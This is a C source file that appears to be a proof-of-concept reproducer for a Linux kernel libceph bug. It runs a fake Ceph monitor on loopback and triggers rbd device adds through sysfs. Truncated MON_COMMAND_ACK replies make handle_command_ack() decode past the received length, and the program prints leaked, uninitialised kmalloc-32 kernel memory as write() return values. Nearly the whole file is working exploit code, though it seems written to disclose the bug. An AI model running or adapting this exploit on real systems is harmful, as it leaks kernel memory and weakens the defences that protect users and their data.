// gcc -O2 -static -o repro repro.c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stddef.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <time.h>

static uint32_t crc32c_tab[256];
static void crc32c_init(void)
{
	uint32_t i, j, c;
	for (i = 0; i < 256; i++) {
		c = i;
		for (j = 0; j < 8; j++)
			c = (c & 1) ? (0x82F63B78u ^ (c >> 1)) : (c >> 1);
		crc32c_tab[i] = c;
	}
}
static uint32_t crc32c(uint32_t crc, const void *data, size_t len)
{
	const unsigned char *p = data;
	while (len--)
		crc = (crc >> 8) ^ crc32c_tab[(crc ^ *p++) & 0xff];
	return crc;
}

#define CEPH_BANNER "ceph v027"
#define CEPH_BANNER_LEN 9

#define CEPH_MSGR_TAG_READY   1
#define CEPH_MSGR_TAG_CLOSE   6
#define CEPH_MSGR_TAG_MSG     7
#define CEPH_MSGR_TAG_ACK     8
#define CEPH_MSGR_TAG_KEEPALIVE   9
#define CEPH_MSGR_TAG_KEEPALIVE2  14
#define CEPH_MSGR_TAG_KEEPALIVE2_ACK 15

#define CEPH_MSG_MON_MAP                4
#define CEPH_MSG_STATFS_REPLY           14
#define CEPH_MSG_MON_SUBSCRIBE          15
#define CEPH_MSG_MON_SUBSCRIBE_ACK      16
#define CEPH_MSG_AUTH                   17
#define CEPH_MSG_AUTH_REPLY             18
#define CEPH_MSG_MON_GET_VERSION        19
#define CEPH_MSG_MON_GET_VERSION_REPLY  20
#define CEPH_MSG_OSD_MAP                41
#define CEPH_MSG_MON_COMMAND            50
#define CEPH_MSG_MON_COMMAND_ACK        51

#define CEPH_ENTITY_TYPE_MON  0x01
#define CEPH_AUTH_NONE        0x1

#define CEPH_MSG_FOOTER_COMPLETE (1<<0)
#define CEPH_MSG_FOOTER_NOCRC    (1<<1)

#define CRUSH_MAGIC 0x00010000u

#define FEATURE_MSG_AUTH        (1ULL << 23)
#define FEATURE_MSGR_KEEPALIVE2 (1ULL << 42)

struct msg_hdr {
	uint64_t seq;
	uint64_t tid;
	uint16_t type;
	uint16_t priority;
	uint16_t version;
	uint32_t front_len;
	uint32_t middle_len;
	uint32_t data_len;
	uint16_t data_off;
	uint8_t  src_type;
	uint64_t src_num;
	uint16_t compat_version;
	uint16_t reserved;
	uint32_t crc;
} __attribute__((packed));

struct msg_footer {
	uint32_t front_crc, middle_crc, data_crc;
	uint64_t sig;
	uint8_t flags;
} __attribute__((packed));

struct msg_connect {
	uint64_t features;
	uint32_t host_type;
	uint32_t global_seq;
	uint32_t connect_seq;
	uint32_t protocol_version;
	uint32_t authorizer_protocol;
	uint32_t authorizer_len;
	uint8_t  flags;
} __attribute__((packed));

struct msg_connect_reply {
	uint8_t  tag;
	uint64_t features;
	uint32_t global_seq;
	uint32_t connect_seq;
	uint32_t protocol_version;
	uint32_t authorizer_len;
	uint8_t  flags;
} __attribute__((packed));

struct buf { unsigned char *d; size_t len, cap; };
static void bput(struct buf *b, const void *p, size_t n)
{
	if (b->len + n > b->cap) {
		b->cap = (b->len + n) * 2 + 256;
		b->d = realloc(b->d, b->cap);
	}
	memcpy(b->d + b->len, p, n);
	b->len += n;
}
static void b8(struct buf *b, uint8_t v)   { bput(b, &v, 1); }
static void b16(struct buf *b, uint16_t v) { bput(b, &v, 2); }
static void b32(struct buf *b, uint32_t v) { bput(b, &v, 4); }
static void b64(struct buf *b, uint64_t v) { bput(b, &v, 8); }
static void bzero_n(struct buf *b, size_t n)
{
	while (n--) b8(b, 0);
}

static const unsigned char FSID[16] = {
	0x11,0x22,0x33,0x44,0x55,0x66,0x77,0x88,
	0x99,0xaa,0xbb,0xcc,0xdd,0xee,0xff,0x00
};

#define MON_PORT 6789

static void fill_in_addr(unsigned char *out, int port, int be_family)
{
	memset(out, 0, 128);
	if (be_family) { out[0] = 0x00; out[1] = 0x02; }
	else           { out[0] = 0x02; out[1] = 0x00; }
	out[2] = (port >> 8) & 0xff;
	out[3] = port & 0xff;
	out[4] = 127; out[5] = 0; out[6] = 0; out[7] = 1;
}

static void make_banner_addr(unsigned char *out , int port)
{
	memset(out, 0, 136);

	fill_in_addr(out + 8, port, 1);
}

static void enc_entity_addr(struct buf *b, int port)
{
	unsigned char ia[128];
	b8(b, 1);
	b8(b, 1);
	b8(b, 1);
	b32(b, 4 + 4 + 4 + 16);
	b32(b, 1);
	b32(b, 0);
	b32(b, 16);
	fill_in_addr(ia, port, 0);
	bput(b, ia, 16);
}

static int send_all(int fd, const void *p, size_t n)
{
	const unsigned char *b = p;
	while (n) {
		ssize_t r = send(fd, b, n, MSG_NOSIGNAL);
		if (r <= 0) return -1;
		b += r; n -= r;
	}
	return 0;
}
static int recv_all(int fd, void *p, size_t n)
{
	unsigned char *b = p;
	while (n) {
		ssize_t r = recv(fd, b, n, 0);
		if (r <= 0) return -1;
		b += r; n -= r;
	}
	return 0;
}

struct conn {
	int fd;
	uint64_t out_seq;
	int maps_sent;
};

static int send_msg(struct conn *c, uint16_t type, uint64_t tid,
		    const void *front, uint32_t front_len)
{
	unsigned char pkt[8192];
	struct msg_hdr h;
	struct msg_footer f;
	size_t off = 0;

	if (front_len > sizeof(pkt) - 128) return -1;

	memset(&h, 0, sizeof(h));
	h.seq = ++c->out_seq;
	h.tid = tid;
	h.type = type;
	h.priority = 127;
	h.version = 1;
	h.front_len = front_len;
	h.middle_len = 0;
	h.data_len = 0;
	h.data_off = 0;
	h.src_type = CEPH_ENTITY_TYPE_MON;
	h.src_num = 0;
	h.compat_version = 1;
	h.reserved = 0;
	h.crc = crc32c(0, &h, offsetof(struct msg_hdr, crc));

	memset(&f, 0, sizeof(f));
	f.front_crc = crc32c(0, front, front_len);
	f.middle_crc = 0;
	f.data_crc = 0;
	f.sig = 0;
	f.flags = CEPH_MSG_FOOTER_COMPLETE | CEPH_MSG_FOOTER_NOCRC;

	pkt[off++] = CEPH_MSGR_TAG_MSG;
	memcpy(pkt + off, &h, sizeof(h)); off += sizeof(h);
	if (front_len) { memcpy(pkt + off, front, front_len); off += front_len; }
	memcpy(pkt + off, &f, sizeof(f)); off += sizeof(f);

	return send_all(c->fd, pkt, off);
}

static void build_auth_reply(struct buf *b)
{
	b->len = 0;
	b32(b, CEPH_AUTH_NONE);
	b32(b, 0);
	b64(b, 0x1234);
	b32(b, 0);
	b32(b, 0);
}

static void build_monmap(struct buf *b)
{
	struct buf inner = {0};
	const char *name = "mon";

	bput(&inner, FSID, 16);
	b32(&inner, 1);
	b32(&inner, 1);
	b32(&inner, 3); bput(&inner, name, 3);
	enc_entity_addr(&inner, MON_PORT);

	{
		struct buf blob = {0};
		b8(&blob, 3);
		b8(&blob, 3);
		b32(&blob, (uint32_t)inner.len);
		bput(&blob, inner.d, inner.len);

		b->len = 0;
		b32(b, (uint32_t)blob.len);
		bput(b, blob.d, blob.len);
		free(blob.d);
	}
	free(inner.d);
}

static void build_subscribe_ack(struct buf *b)
{
	b->len = 0;
	b32(b, 3600);
	bput(b, FSID, 16);
}

static void build_crush(struct buf *b)
{
	b->len = 0;
	b32(b, CRUSH_MAGIC);
	b32(b, 0);
	b32(b, 0);
	b32(b, 0);
	b32(b, 0);
	b32(b, 0);
	b32(b, 0);

}

static void build_osdmap_blob(struct buf *b)
{
	struct buf pool = {0}, crush = {0};

	b->len = 0;
	b16(b, 6);
	bput(b, FSID, 16);
	b32(b, 1);
	b32(b, 0); b32(b, 0);
	b32(b, 0); b32(b, 0);

	b32(b, 1);
	b64(b, 0);

	b8(&pool, 1);
	b8(&pool, 3);
	b8(&pool, 0);
	b8(&pool, 2);
	b32(&pool, 8);
	b32(&pool, 8);
	bzero_n(&pool, 8 + 4 + 8 + 4);
	b32(&pool, 0);
	b32(&pool, 0);
	b64(&pool, 0);
	b64(&pool, 0);
	b32(&pool, 0);
	b8(b, 5);
	b8(b, 5);
	b32(b, (uint32_t)pool.len);
	bput(b, pool.d, pool.len);

	b32(b, 1);
	b64(b, 0);
	b32(b, 3); bput(b, "rbd", 3);

	b32(b, 0);
	b32(b, 0);
	b32(b, 0);
	b32(b, 0);
	b32(b, 0);
	b32(b, 0);
	b32(b, 0);

	build_crush(&crush);
	b32(b, (uint32_t)crush.len);
	bput(b, crush.d, crush.len);

	free(pool.d);
	free(crush.d);
}

static void build_osdmap_msg(struct buf *b)
{
	struct buf blob = {0};
	build_osdmap_blob(&blob);

	b->len = 0;
	bput(b, FSID, 16);
	b32(b, 0);
	b32(b, 1);
	b32(b, 1);
	b32(b, (uint32_t)blob.len);
	bput(b, blob.d, blob.len);
	free(blob.d);
}

#define MODE_PLANT   1
#define MODE_RAW     2
#define MODE_CONTROL 3

static volatile int g_mode = MODE_CONTROL;
static volatile uint32_t g_plant = (uint32_t)-3999;
static volatile uint32_t g_short_front = 18;
static volatile int g_hits = 0;

static void handle_get_version(struct conn *c, uint64_t tid)
{
	unsigned char front[64];
	int mode = g_mode;

	fprintf(stderr, "[mon] MMonGetVersion tid=%llu  (mode=%d)\n",
		(unsigned long long)tid, mode);

	if (mode == MODE_CONTROL) {

		memset(front, 0, sizeof(front));
		*(uint32_t *)(front + 18) = g_plant;
		send_msg(c, CEPH_MSG_MON_COMMAND_ACK, tid, front, 22);
		g_hits++;
		return;
	}

	if (mode == MODE_PLANT) {

		memset(front, 0x5a, 32);
		*(uint32_t *)(front + 18) = g_plant;
		send_msg(c, CEPH_MSG_STATFS_REPLY, tid, front, 32);
		usleep(50000);
	}

	memset(front, 0, sizeof(front));
	send_msg(c, CEPH_MSG_MON_COMMAND_ACK, tid, front, g_short_front);
	g_hits++;
}

static void *conn_thread(void *arg)
{
	struct conn c;
	unsigned char banner[CEPH_BANNER_LEN + 136 + 136];
	unsigned char peer_banner[CEPH_BANNER_LEN + 136];
	struct msg_connect req;
	struct msg_connect_reply rep;
	struct buf tmp = {0};

	memset(&c, 0, sizeof(c));
	c.fd = (int)(long)arg;

	memcpy(banner, CEPH_BANNER, CEPH_BANNER_LEN);
	make_banner_addr(banner + CEPH_BANNER_LEN, MON_PORT);
	make_banner_addr(banner + CEPH_BANNER_LEN + 136, 40000);
	if (send_all(c.fd, banner, sizeof(banner)) < 0) goto out;
	if (recv_all(c.fd, peer_banner, sizeof(peer_banner)) < 0) goto out;

	if (recv_all(c.fd, &req, sizeof(req)) < 0) goto out;
	if (req.authorizer_len) {
		unsigned char *a = malloc(req.authorizer_len);
		if (recv_all(c.fd, a, req.authorizer_len) < 0) { free(a); goto out; }
		free(a);
	}
	memset(&rep, 0, sizeof(rep));
	rep.tag = CEPH_MSGR_TAG_READY;

	rep.features = req.features & ~FEATURE_MSGR_KEEPALIVE2;
	rep.global_seq = 1;
	rep.connect_seq = req.connect_seq + 1;
	rep.protocol_version = req.protocol_version;
	rep.authorizer_len = 0;
	rep.flags = 0;
	if (send_all(c.fd, &rep, sizeof(rep)) < 0) goto out;

	fprintf(stderr, "[mon] session up (fd %d)\n", c.fd);

	for (;;) {
		unsigned char tag;
		struct msg_hdr h;
		struct msg_footer f;
		unsigned char *front = NULL;

		if (recv_all(c.fd, &tag, 1) < 0) goto out;
		if (tag == CEPH_MSGR_TAG_ACK) {
			uint64_t s;
			if (recv_all(c.fd, &s, 8) < 0) goto out;
			continue;
		}
		if (tag == CEPH_MSGR_TAG_KEEPALIVE)
			continue;
		if (tag == CEPH_MSGR_TAG_KEEPALIVE2) {
			unsigned char ts[8];
			if (recv_all(c.fd, ts, 8) < 0) goto out;
			{
				unsigned char r[9];
				r[0] = CEPH_MSGR_TAG_KEEPALIVE2_ACK;
				memcpy(r + 1, ts, 8);
				if (send_all(c.fd, r, 9) < 0) goto out;
			}
			continue;
		}
		if (tag == CEPH_MSGR_TAG_CLOSE)
			goto out;
		if (tag != CEPH_MSGR_TAG_MSG) {
			fprintf(stderr, "[mon] unexpected tag %d\n", tag);
			goto out;
		}

		if (recv_all(c.fd, &h, sizeof(h)) < 0) goto out;
		if (h.front_len) {
			front = malloc(h.front_len);
			if (recv_all(c.fd, front, h.front_len) < 0) { free(front); goto out; }
		}
		if (h.middle_len) {
			unsigned char *m = malloc(h.middle_len);
			if (recv_all(c.fd, m, h.middle_len) < 0) { free(m); free(front); goto out; }
			free(m);
		}
		if (h.data_len) {
			unsigned char *d = malloc(h.data_len);
			if (recv_all(c.fd, d, h.data_len) < 0) { free(d); free(front); goto out; }
			free(d);
		}
		if (recv_all(c.fd, &f, sizeof(f)) < 0) { free(front); goto out; }

		switch (h.type) {
		case CEPH_MSG_AUTH:
			build_auth_reply(&tmp);
			send_msg(&c, CEPH_MSG_AUTH_REPLY, 0, tmp.d, tmp.len);
			break;
		case CEPH_MSG_MON_SUBSCRIBE:
			if (!c.maps_sent) {
				c.maps_sent = 1;
				build_monmap(&tmp);
				send_msg(&c, CEPH_MSG_MON_MAP, 0, tmp.d, tmp.len);
			}
			build_subscribe_ack(&tmp);
			send_msg(&c, CEPH_MSG_MON_SUBSCRIBE_ACK, 0, tmp.d, tmp.len);
			if (c.maps_sent == 1) {
				c.maps_sent = 2;
				build_osdmap_msg(&tmp);
				send_msg(&c, CEPH_MSG_OSD_MAP, 0, tmp.d, tmp.len);
			}
			break;
		case CEPH_MSG_MON_GET_VERSION:
			handle_get_version(&c, h.tid);
			break;
		default:
			fprintf(stderr, "[mon] msg type %u tid %llu front %u\n",
				h.type, (unsigned long long)h.tid, h.front_len);
			break;
		}
		free(front);
	}
out:
	fprintf(stderr, "[mon] connection closed (fd %d)\n", c.fd);
	free(tmp.d);
	close(c.fd);
	return NULL;
}

static void *mon_server(void *arg)
{
	int s, on = 1;
	struct sockaddr_in sa;

	(void)arg;
	s = socket(AF_INET, SOCK_STREAM, 0);
	setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &on, sizeof(on));
	memset(&sa, 0, sizeof(sa));
	sa.sin_family = AF_INET;
	sa.sin_port = htons(MON_PORT);
	sa.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
	if (bind(s, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
		perror("bind");
		exit(1);
	}
	listen(s, 64);
	fprintf(stderr, "[mon] listening on 127.0.0.1:%d\n", MON_PORT);
	for (;;) {
		int fd = accept(s, NULL, NULL);
		pthread_t t;
		if (fd < 0) continue;
		setsockopt(fd, IPPROTO_TCP, 1 , &on, sizeof(on));
		pthread_create(&t, NULL, conn_thread, (void *)(long)fd);
		pthread_detach(t);
	}
	return NULL;
}

#define RBD_ADD "/sys/bus/rbd/add_single_major"
#define CEPH_OPTS "name=admin,mount_timeout=300"

static long rbd_add(const char *pool, const char *image)
{
	char cmd[256];
	int fd;
	long r;

	snprintf(cmd, sizeof(cmd), "127.0.0.1:%d " CEPH_OPTS " %s %s",
		 MON_PORT, pool, image);
	fd = open(RBD_ADD, O_WRONLY);
	if (fd < 0) {
		perror("open " RBD_ADD);
		return -1;
	}

	errno = 0;
	r = syscall(SYS_write, fd, cmd, strlen(cmd));
	if (r == -1 && errno)
		r = -(long)errno;
	close(fd);
	return r;
}

static void *holder_thread(void *arg)
{
	long r;
	(void)arg;

	r = rbd_add("rbd", "holder");
	fprintf(stderr, "[poc] holder add returned %ld\n", r);
	return NULL;
}

static void report(const char *what, long r)
{
	int32_t v = (int32_t)r;
	printf("[poc] %-28s write() -> %ld   (as s32: %d / 0x%08x)\n",
	       what, r, v, (uint32_t)v);
	fflush(stdout);
}

int main(void)
{
	pthread_t t;
	int i, fd;
	long r;

	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);
	crc32c_init();

	fd = open("/proc/sys/kernel/printk", O_WRONLY);
	if (fd >= 0) { write(fd, "8 4 1 7\n", 8); close(fd); }

	pthread_create(&t, NULL, mon_server, NULL);
	usleep(300000);

	printf("=== libceph handle_command_ack() out-of-received-range decode ===\n");

	g_mode = MODE_CONTROL;
	pthread_create(&t, NULL, holder_thread, NULL);
	sleep(4);

	g_mode = MODE_CONTROL;
	g_plant = (uint32_t)-3999;
	r = rbd_add("nosuchpool", "img");
	report("control (front_len=22)", r);
	printf("        expected -3999 : the value we actually sent\n\n");

	g_mode = MODE_PLANT;
	g_plant = (uint32_t)-3001;
	g_short_front = 18;
	r = rbd_add("nosuchpool", "img");
	report("phase1 (front_len=18)", r);
	printf("        the ACK carried NO result field at all; -3001 came\n"
	       "        from bytes left in the 32-byte reply buffer by an earlier,\n"
	       "        REJECTED message -> handle_command_ack() decoded past the\n"
	       "        received length.\n\n");

	g_plant = (uint32_t)-3002;
	r = rbd_add("nosuchpool", "img");
	report("phase1 (front_len=18) #2", r);
	printf("\n");

	g_short_front = 0;
	g_plant = (uint32_t)-3003;
	r = rbd_add("nosuchpool", "img");
	report("phase1 (front_len=0)", r);
	printf("        front_len == 0: the peer sent an empty payload and the\n"
	       "        kernel still returned 4 bytes out of that buffer.\n\n");

	printf("=== phase 2: raw uninitialised kmalloc-32 disclosure ===\n");
	g_mode = MODE_RAW;
	g_short_front = 18;
	for (i = 0; i < 24; i++) {
		char lbl[64];
		r = rbd_add("nosuchpool", "img");
		snprintf(lbl, sizeof(lbl), "raw uninit sample %2d", i);
		report(lbl, r);
		if (r == 0 || (r > 0 && r < 4096))
			printf("        (leaked dword was 0 -> request 'succeeded')\n");
		usleep(20000);
	}

	printf("[poc] hits=%d\n", g_hits);
	sleep(2);
	return 0;
}
